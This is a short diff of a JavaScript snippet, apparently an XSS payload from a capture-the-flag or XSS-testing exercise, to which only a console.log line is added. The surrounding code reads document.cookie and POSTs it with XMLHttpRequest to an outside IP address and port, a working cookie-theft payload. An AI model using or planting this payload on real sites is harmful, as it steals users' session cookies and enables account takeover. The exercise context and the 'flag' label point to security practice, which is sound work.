@@ -1,5 +1,6 @@
 let xhr = new XMLHttpRequest();
 let xhrbody = "header=flag&listener=testmyxss&content=Hello. " + document.cookie;
+console.log(xhrbody);
 xhr.open("post","http://39.101.137.200:7745/send");
 xhr.send(xhrbody);
 
